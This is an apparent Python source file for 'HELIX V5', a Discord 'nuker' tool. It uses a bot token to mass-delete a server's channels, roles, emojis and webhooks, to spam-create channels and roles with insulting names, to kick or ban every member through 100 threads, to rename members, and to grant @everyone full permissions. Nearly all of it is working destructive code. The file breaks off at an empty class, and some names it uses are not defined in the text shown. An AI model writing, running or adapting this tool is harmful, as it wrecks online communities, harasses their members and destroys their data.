import requests
import threading
import random 
import time
import os
from sys import stdout
from datetime import datetime
import webbrowser as wb
import queue
color = "\033[1;31;40m"
count = []
txt = ''
rtxt = ''
mtxt = ''
member_name = ""
cmd = ""
class Clrs:
    @staticmethod
    def color_red():
        global color
        os.system("cls")
        color="\033[1;31;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_magenta():
        global color
        os.system("cls")
        color="\033[1;35;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_grey():
        global color
        os.system("cls")
        color="\033[1;30;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_green():
        global color
        os.system("cls")
        color="\033[1;32;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_yellow():
        global color
        os.system("cls")
        color="\033[1;33;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_blue():
        global color
        os.system("cls")
        color="\033[1;34;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
    @staticmethod
    def color_cyan():
        global color
        os.system("cls")
        color="\033[1;36;40m"
        time.sleep(0.5)
        ChangeTheme.menu()
def println(text):
    for t in text:
        stdout.write(t)
        stdout.flush()
        time.sleep(0.002)
def color_R(text):
    return f"{color}(\033[1;37;40m>>{color})\033[1;37;40m {text}"
def color_W(text):
    return f"{color}(\033[1;37;40m!{color})\033[1;37;40m {text}"
def color_info(text):
    return f"{color}(\033[1;37;40mINFO{color})\033[1;37;40m {text}"
def color_plus(text):
    return f"{color}(\033[1;37;40m+{color})\033[1;37;40m {text}"
def color_minus(text):
    return f"{color}(\033[1;37;40m-{color})\033[1;37;40m {text}"
def get_date():
    return f"{color}[\033[1;37;40m{datetime.now().time()}{color}]\033[1;37;40m"
def get_status_code(code):
    return f"{color}<\033[1;37;40m{code}{color}>\033[1;37;40m"
def channel_type(c_type):
    return f"{color}[\033[1;37;40m{c_type}{color}]\033[1;37;40m"

server_id = None

def enter_server_id():
    global server_id
    os.system("cls & mode 80,20 & title HELIX V5 - Enter server id")
    println(color_R("Server id: "));server_id=input()
    os.system("cls & title HELIX V5 - Checking id...")
    try:
        r = requests.get(f"https://discord.com/api/v9/guilds/{str(server_id)}",headers=headers)
    except requests.ConnectionError:
        time.sleep(0.5)
        os.system("cls  & title HELIX V5 - [!]")
        println(color_W("Please check your internet connection and try again"))
        time.sleep(1)
        menu()                  
    else:
        if r.status_code == 200:
            os.system("cls  & title HELIX V5 - Valid id")
            println(color_R(( f"Server name: {r.json()['name']}")))
            print("\n")
            input(color_info("Press enter to continue\n"))
            os.system("cls")
            menu()
        elif r.status_code == 400:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid id"))
            time.sleep(1)
            menu()
        elif r.status_code == 403:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Bot is not in guild"))
            time.sleep(1)
            menu()
        elif server_id in ['']:
            os.system("cls  & title HELIX V5 - [!]")
            println(color_W("Invalid id"))
            time.sleep(1)
            menu()
        else:
            menu()

                     

class NukeFunctions:
    @staticmethod
    def DeleteChannels(channel):
        global count
        while True:
            try:
                r = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}",headers=headers)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} {channel_type('?')} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} {channel_type(channel['type'])} Deleted: #{channel['name']}"))
                        count.append(0)
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} {channel_type(channel['type'])} Cannot delete: #{channel['name']}"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))

    @staticmethod
    def CreateChannels(guild_id,channel_name,type):
        global count
        while True:
            try:
                payload = {'name':channel_name,'type':type}
                r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=headers,json=payload)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} {channel_type('?')} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} {channel_type(type)} Created: #{channel_name}"))
                        count.append(0) 
                        break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} {channel_type(type)} Missing permissions"))
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} {channel_type(type)} Cannot create: #{channel_name}"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))
    @staticmethod
    def DeleteRoles(guild_id,role):
        global count
        while True:
            try:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}",headers=headers)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        if not role['name'].startswith("@"):
                            print(color_plus(f"{get_status_code(r.status_code)} {get_date()} Deleted: @{role['name']}"))
                            count.append(0)
                            break
                        else:
                            print(color_plus(f"{get_status_code(r.status_code)} {get_date()} Deleted: {role['name']}"))
                            count.append(0)
                            break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))
                        break
                    else:
                        if not role['name'].startswith("@"):
                            print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Cannot delete: @{role['name']}"))
                            break
                        else:
                            print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Cannot delete: {role['name']}"))
                            break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))
    @staticmethod
    def CreateRoles(guild_id,role_name):
        global count
        while True:
            try:
                payload = {'name':role_name}
                r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles",headers=headers,json=payload)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} Created: @{role_name}"))
                        count.append(0) 
                        break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Cannot create: @{role_name}"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))
    @staticmethod
    def DeleteEmojis(guild_id,emoji):
        global count
        while True:
            try:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji['id']}",headers=headers)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} Deleted: {emoji['name']}"))
                        count.append(0)
                        break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Cannot delete: {emoji['name']}"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))
    @staticmethod
    def DeleteWebhooks(webhook):
        global count
        while True:
            try:
                r = requests.delete(f"https://discord.com/api/v9/webhooks/{webhook['id']}",headers=headers)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} Deleted: {webhook['name']}"))
                        count.append(0)
                        break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Cannot delete: {webhook['name']}"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))
    @staticmethod
    def ChangeNickname(guild_id,member,nick_name):
        while True:
            try:
                payload = {'nick':nick_name}
                r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/{member['user']['id']}",headers=headers,json=payload)
                if "retry_after" in r.text:
                    print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {r.json()['retry_after']}s"))
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code in [200,201,204]:
                        print(color_plus(f"{get_status_code(r.status_code)} {get_date()} {member['user']['username']}#{member['user']['discriminator']} --> {nick_name}"))
                        count.append(0)
                        break
                    elif "Missing Permissions" in r.text:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))
                        break
                    else:
                        print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Error while changing nick name"))
                        break
            except requests.ConnectionError:
                print(color_minus(f"{get_status_code('000')} {get_date()} Bad internet connection"))
            except:
                print(color_minus(f"{get_status_code('000')} {get_date()} Error"))

concurrent = 100
q1 = queue.Queue(concurrent * 2)
def start_():
    while True:   
        request_method,request_url,response_headers= q1.get()
        try:
            r = request_method(request_url,headers=response_headers)
            if r.status_code == 429:
                retry = r.json()
                print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Retrying in {retry['retry_after']}s"))
                q1.put((request_method,request_url,response_headers))
            if r.status_code in [200,201,204]:
                print(color_plus(f"{get_status_code(r.status_code)} {get_date()} {cmd}: {member_name}"))
                count.append(1)
            if "Missing Permissions" in r.text:
                print(color_minus(f"{get_status_code(r.status_code)} {get_date()} Missing permissions"))          
        except requests.ConnectTimeout:
            q1.put((request_method,request_url,response_headers))
        except requests.ConnectionError:
            print(color_minus(f"{get_status_code('000')} {get_date()}  Bad internet connection"))
        except: 
            pass
        q1.task_done()
for i in range(concurrent):
    threading.Thread(target=start_,daemon=True).start()

class Run:
    @staticmethod
    def start_deleting_channels():
        global count
        count.clear()
        os.system(f"cls & mode 80,20 & title HELIX V5 - Fetching {option}...")  
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/channels",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - Failed to delete channels")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            pass
        else:
            if response.status_code in [200,201,204]:
                channels = response.json()
                if not channels:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 channels"))
                    time.sleep(1)
                    ChannelsMenu.DeleteChannelsMenu()
                else:
                    if option == 'all channels':
                        os.system(f"cls & title HELIX V5 - Delete {option}")
                        for channel in channels:
                            threading.Thread(target=NukeFunctions.DeleteChannels,args=(channel,)).start()
                    elif option == 'text channels':
                        os.system(f"cls & title HELIX V5 - Delete {option}")
                        for channel in channels:
                            if channel['type'] == 0:
                                threading.Thread(target=NukeFunctions.DeleteChannels,args=(channel,)).start()
                    elif option == 'voice channels':
                        os.system(f"cls & title HELIX V5 - Delete {option}")
                        for channel in channels:
                            if channel['type'] == 2:
                                threading.Thread(target=NukeFunctions.DeleteChannels,args=(channel,)).start()
                    elif option == 'categories':
                        os.system(f"cls & title HELIX V5 - Delete {option}")
                        for channel in channels:
                            if channel['type'] == 4:
                                threading.Thread(target=NukeFunctions.DeleteChannels,args=(channel,)).start()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to delete {option}")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
            
    
    @staticmethod
    def start_spamming_channels():
        global count
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Please wait...")  
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                os.system(f"cls & title HELIX V5 - Spam {txt}")
                print(f"""
{n(1)} Custom name
{n(2)} Random name
{n(3)} Go back""")
                print()
                custom_random = input(color_R("Choice: "))
                os.system("cls")
                if custom_random=='1':
                    os.system(f"cls & title HELIX V5 - Spam {txt}[Custom name]")
                    println(color_R("Channel name: "));channel_name=input()
                    if channel_name.strip() in ['']:
                        os.system(f"cls & title HELIX V5 - Failed to spam {txt}")
                        println(color_W("Please enter the name of channel"))
                        time.sleep(1)
                        Run.start_spamming_channels()
                    else:
                        try:
                            println(color_R("Amount: "));amount = int(input())
                        except:
                            os.system(f"cls & title HELIX V5 - Failed to spam {txt}")
                            println(color_W("Please enter the amount"))
                            time.sleep(1)
                            Run.start_spamming_channels()
                        else:
                            os.system("cls")
                            for i in range(amount):
                                threading.Thread(target=NukeFunctions.CreateChannels,args=(server_id,channel_name,spam_type)).start()
                elif custom_random=='2':
                    os.system(f"cls & title HELIX V5 - Spam {txt}[Random name]")
                    random_names  = ['lol','LMAO','SHIT SERVER','LEAVE THIS SERVER','HEHE','👍']
                    try:
                        println(color_R("Amount: "));amount = int(input())
                    except:
                        os.system(f"cls & title HELIX V5 - Failed to spam  {txt}")
                        println(color_W("Please enter the amount"))
                        time.sleep(1)
                        Run.start_spamming_channels()
                    else:
                        os.system("cls")
                        for i in range(amount):
                            name = random.choice(random_names)
                            threading.Thread(target=NukeFunctions.CreateChannels,args=(server_id,name,spam_type)).start()
                elif custom_random=='3':
                    ChannelsMenu.SpamChannelsMenu()
                else:
                    os.system(f"cls & title HELIX V5 - Failed to spam {txt}")
                    println(color_W("Invalid choice"))
                    time.sleep(1)
                    Run.start_spamming_channels()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to spam {txt}")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_deleting_roles():
        global count
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Fetching roles...")  
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/roles",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                roles = response.json()
                if not roles:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 roles"))
                    time.sleep(1)
                    menu()
                else:
                    os.system("cls  & title HELIX V5 - Delete roles")  
                    for role in roles:
                        threading.Thread(target=NukeFunctions.DeleteRoles,args=(server_id,role)).start()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to delete roles")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_spamming_roles():
        global count
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Please wait...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                os.system(f"cls & title HELIX V5 - Spam roles[{rtxt}]")
                if rtxt=='Custom name':
                    println(color_R("Role name: "));role_name=input()
                    if role_name.strip() in ['']:
                        os.system("cls  & title HELIX V5 - Failed to create roles")
                        println(color_W("Please enter the name of role"))
                        time.sleep(1)
                        RolesMenu.CreateRolesMenu()
                    else:
                        try:
                            println(color_R("Amount: "));amount=int(input())
                        except:
                            os.system("cls & title HELIX V5 - Failed to create roles")
                            println(color_W("Please enter the amount"))
                            time.sleep(1)
                            RolesMenu.CreateRolesMenu()
                        else:
                            os.system("cls")
                            for i in range(amount):
                                threading.Thread(target=NukeFunctions.CreateRoles,args=(server_id,role_name)).start()
                elif rtxt == 'Random name':
                    random_names = ['lol','shit server','fked up','LMAO']
                    try:
                        println(color_R("Amount: "));amount=int(input())
                    except:
                        os.system("cls & title HELIX V5 - Failed to create roles")
                        println(color_W("Please enter the amount"))
                        time.sleep(1)
                        RolesMenu.CreateRolesMenu()
                    else:
                        os.system("cls")
                        for i in range(amount):
                            name = random.choice(random_names)
                            threading.Thread(target=NukeFunctions.CreateRoles,args=(server_id,name)).start()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to Create roles[{rtxt}]")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_deleting_emojis():
        global count
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Fetching emojis...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/emojis",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                emojis= response.json()
                if not emojis:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 emojis"))
                    time.sleep(1)
                    menu()
                else:
                    os.system("cls & title HELIX V5 - Delete emojis")
                    for emoji in emojis:
                        threading.Thread(target=NukeFunctions.DeleteEmojis,args=(server_id,emoji)).start()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to delete emojis")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_deleting_webhooks():
        global count
        count.clear()
        os.system('cls & mode 80,20 & title HELIX V5 - Fetching webhooks...')
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/webhooks",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                webhooks = response.json()
                if not webhooks:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 webhooks"))
                    time.sleep(1)
                    menu()
                else:
                    os.system("cls & title HELIX V5 - Delete webhooks")
                    for webhook in webhooks:
                        threading.Thread(target=NukeFunctions.DeleteWebhooks,args=(webhook,)).start()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to delete webhooks")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_kicking_members():
        global count,member_name,cmd
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Fetching members...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                members = response.json()
                if not members:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 members"))
                    time.sleep(1)
                    MemberOptions.memberOptions()
                else:
                    os.system("cls & title HELIX V5 - Kick members")
                    for member in members:
                        member_name = f"{member['user']['username']}#{member['user']['discriminator']}"
                        cmd = "Kicked"
                        q1.put((requests.delete,f"https://discord.com/api/v9/guilds/{server_id}/members/{member['user']['id']}",headers))
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to kick members")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_banning_members():
        global count,member_name,cmd
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Fetching members...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                members = response.json()
                if not members:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 members"))
                    time.sleep(1)
                    MemberOptions.memberOptions()
                else:
                    os.system("cls & title HELIX V5 - Ban members")
                    for member in members:
                        member_name = f"{member['user']['username']}#{member['user']['discriminator']}"
                        cmd = "Banned"
                        q1.put((requests.put,f"https://discord.com/api/v9/guilds/{server_id}/bans/{member['user']['id']}",headers))
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to ban members")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_changing_nickname():
        global count
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Fetching members...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                members = response.json()
                if not members:
                    os.system("cls & title HELIX V5")
                    println(color_info("This server has 0 members"))
                    time.sleep(1)
                    MemberOptions.memberOptions()
                else:
                    os.system(f"cls & title HELIX V5 - Change nick name[{mtxt}]")
                    if mtxt == 'Custom name':
                        println(color_R("Nick name: "));nick_name = input()
                        if nick_name.strip() in ['']:
                            os.system("cls & title HELIX V5 - [!]")
                            println(color_W("Please enter the name"))
                            time.sleep(1)
                            MemberOptions.memberOptions()
                        else:
                            os.system("cls")
                            for member in members:
                                threading.Thread(target=NukeFunctions.ChangeNickname,args=(server_id,member,nick_name)).start()
                    elif mtxt == 'Random name':
                        random_names = ['........','fsd#fgh','%jfg','23@fdfs','&asdf']
                        for member in members:
                            name = random.choice(random_names)
                            threading.Thread(target=NukeFunctions.ChangeNickname,args=(server_id,member,name)).start()
                    
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def start_unbanning_all():
        global count,member_name,cmd
        count.clear()
        os.system("cls & mode 80,20 & title HELIX V5 - Please wait ...")
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/bans",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                users = response.json()
                if not users:
                    os.system("cls & title HELIX V5")
                    println(color_info("No bans"))
                    time.sleep(1)
                    menu()
                else:
                    os.system("cls & title HELIX V5 - Unban all")
                    for user in users:
                        member_name = f"{user['user']['username']}#{user['user']['discriminator']}"
                        cmd = "Unbanned"
                        q1.put((requests.delete,f"https://discord.com/api/v9/guilds/{server_id}/bans/{user['user']['id']}",headers))
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - Failed to Unban users")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def GiveAdmin():
        os.system("cls & mode 80,20 & title HELIX V5 - Please wait ...")
        try:
            payload={'name':'@everyone',
            'permissions':'2199023255551'}
            response = requests.patch(f"https://discord.com/api/v9/guilds/{server_id}/roles/930783364955373579",headers=headers,json=payload)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code==200:
                os.system("cls & title HELIX V5 - Give admin")
                println(color_plus("Done"))
                time.sleep(1)
                menu()
            elif "Missing Permissions" in response.text:
                os.system("cls & title HELIX V5 - [!]")
                println(color_minus("Missing permissions"))
                time.sleep(1)
                menu()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()
    @staticmethod
    def change_name():
        os.system("cls & mode 80,20 & title HELIX V5 - Change name")
        println(color_R("New name: "));name=input()
        if name.strip() in ['']:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please enter the name"))
            time.sleep(1)
            menu()
        else:
            try:
                payload={'name':name}
                response = requests.patch(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers,json=payload)
            except requests.ConnectionError:
                time.sleep(0.5)
                os.system("cls & title HELIX V5 - [!]")
                println(color_W("Please check your internet connection and try again"))
                time.sleep(1)
                menu()
            except:
                menu()
            else:
                if response.status_code in [200,201,204]:
                    os.system("cls")
                    println(color_plus("Done"))
                    time.sleep(1)
                    menu()
                elif "Missing Permissions" in response.text:
                    os.system("cls & title HELIX V5 - [!]")
                    println(color_minus("Missing permissions"))
                    time.sleep(1)
                    menu()
                elif response.status_code in [400,403,404]:
                    os.system(f"cls & title HELIX V5 - [!]")
                    println(color_W("Please enter the server id"))
                    time.sleep(1)
                    menu()
                else:
                    menu()
    @staticmethod
    def ServerInfo():
        os.system("cls & mode 80,20 & title HELIX V5 - Server information")
        try: 
            response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}",headers=headers)
        except requests.ConnectionError:
            time.sleep(0.5)
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Please check your internet connection and try again"))
            time.sleep(1)
            menu()
        except:
            menu()
        else:
            if response.status_code in [200,201,204]:
                info = response.json()
                print(color_R(f"Server name: {info['name']}"))
                print(color_R(f"Server id: {info['id']}"))
                print(color_R(f"Owner id: {info['owner_id']}"))
                print(color_R(f"Region: {info['region']}"))
                print(color_R(f"Afk timeout: {info['afk_timeout']}"))
                print()
                input(color_info("Press enter to continue\n"))
                os.system('cls')
                menu()
            elif response.status_code in [400,403,404]:
                os.system(f"cls & title HELIX V5 - [!]")
                println(color_W("Please enter the server id"))
                time.sleep(1)
                menu()
            else:
                menu()         


class ChannelsMenu:
    @staticmethod
    def DeleteChannelsMenu():
        global option
        option = ""
        os.system("cls & title HELIX V5 - Delete channels")
        print(f"""
{n(1)} Delete all channels
{n(2)} Delete text channels
{n(3)} Delete voice channels
{n(4)} Delete categories
{n(5)} Exit to menu
    """)
        print()
        choice2 = input(color_R("Choice: "))
        os.system("cls")
        if choice2 == '1':
            option = "all channels"
            Run.start_deleting_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Deleted: {len(count)} channel"))
            else:
                println(color_info(f"Deleted: {len(count)} channels"))
            time.sleep(1)
            ChannelsMenu.DeleteChannelsMenu()
        elif choice2 == '2':
            option = "text channels"
            Run.start_deleting_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Deleted: {len(count)} text channel"))
            else:
                println(color_info(f"Deleted: {len(count)} text channels"))
            time.sleep(1)
            ChannelsMenu.DeleteChannelsMenu()
        elif choice2 == '3':
            option = "voice channels"
            Run.start_deleting_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Deleted: {len(count)} voice channel"))
            else:
                println(color_info(f"Deleted: {len(count)} voice channels"))
            time.sleep(1)
            ChannelsMenu.DeleteChannelsMenu()
        elif choice2 == '4':
            option = "categories"
            Run.start_deleting_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Deleted: {len(count)} category"))
            else:
                println(color_info(f"Deleted: {len(count)} categories"))
            time.sleep(1)
            ChannelsMenu.DeleteChannelsMenu()
        elif choice2 == '5':
            menu()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid choice"))
            time.sleep(1)
            ChannelsMenu.DeleteChannelsMenu()
    @staticmethod
    def SpamChannelsMenu():
        global spam_type,txt
        txt=""
        os.system("cls & mode 80,20 & title HELIX V5 - Spam channels")
        print(f"""
{n(1)} Spam text channels
{n(2)} Spam voice channels
{n(3)} Spam categories
{n(4)} Exit to menu""")
        print()
        choice = input(color_R("Choice: "))
        os.system("cls")
        if choice == '1':
            spam_type=0
            txt='text channels'
            Run.start_spamming_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Created: {len(count)} text channel"))
            else:
                println(color_info(f"Created: {len(count)} text channels"))
            time.sleep(1)
            ChannelsMenu.SpamChannelsMenu()
        elif choice == '2':
            spam_type=2
            txt='voice channels'
            Run.start_spamming_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Created: {len(count)} voice channel"))
            else:
                println(color_info(f"Created: {len(count)} voice channels"))
            time.sleep(1)
            ChannelsMenu.SpamChannelsMenu()
        elif choice == '3':
            spam_type=4
            txt='categories'
            Run.start_spamming_channels()
            input()
            os.system("cls")
            if len(count)==1:
                println(color_info(f"Created: {len(count)} category"))
            else:
                println(color_info(f"Created: {len(count)} categories"))
            time.sleep(1)
            ChannelsMenu.SpamChannelsMenu()
        elif choice == '4':
            menu()
        else:
            os.system("cls & title HELIX V5 - [!]")
            println(color_W("Invalid choice"))
            time.sleep(1)
            ChannelsMenu.SpamChannelsMenu()

class RolesMenu:
    @staticmethod
